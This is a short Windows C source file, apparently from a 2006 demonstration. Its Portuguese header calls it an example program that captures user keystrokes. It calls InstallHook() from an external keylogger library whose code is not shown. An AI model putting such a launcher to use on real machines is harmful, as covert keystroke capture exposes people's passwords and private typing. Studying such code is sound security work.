/** @file Exemplo de programa que captura digitação do usuário.

@author Wanderley Caloni
@date dec.2006
*/
#include "../ocskeyl2/ocskeyl2.h"
#include <windows.h>


int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
{
	DWORD ret = InstallHook();
	ExitProcess(ret);
}
